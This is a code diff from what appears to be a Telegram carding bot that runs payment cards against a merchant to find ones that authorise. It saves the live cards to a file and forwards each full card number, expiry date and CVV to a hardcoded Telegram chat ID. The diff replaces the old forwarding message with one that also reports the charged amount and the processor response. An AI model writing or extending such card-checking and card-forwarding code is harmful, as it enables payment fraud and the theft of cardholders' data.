@@ -532,11 +532,20 @@ async function processCard(chatId, cardText) {
                     
                     // Save live card
                     fs.appendFileSync('CCNLIVES_TG.txt', cardText + '\n');
-                    await forwardersd(`Live Card ${cc}|${mm}|${yyyy}|${cvv} galing bot pare`, 6050175626);
                     
                     let errorMsg = 'Success';
                     const parsedResponse = safeJsonParse(responseObj);
                     errorMsg = parsedResponse?.ErrorMessage || 'Payment Authorised';
+                    
+                    // Forward to notification with amount and response
+                    await forwardersd(
+                        `✅ <b>Live Card</b>\n\n` +
+                        `💳 ${cc}|${mm}|${yyyy}|${cvv}\n` +
+                        `💰 Amount: $${totalAmount} (${quantity} × $${pricePerQuantity.toFixed(2)})\n` +
+                        `📝 Response: ${errorMsg}`, 
+                        6050175626
+                    );
+                    
                     result = {
                         status: 'live',
                         message: `✅ *LIVE*\n\n💳 \`${cardText}\`\n💰 *Amount:* $${totalAmount} (${quantity} × $${pricePerQuantity.toFixed(2)})\n\n📝 *Response:*\nPayment Authorised [${errorMsg}]`
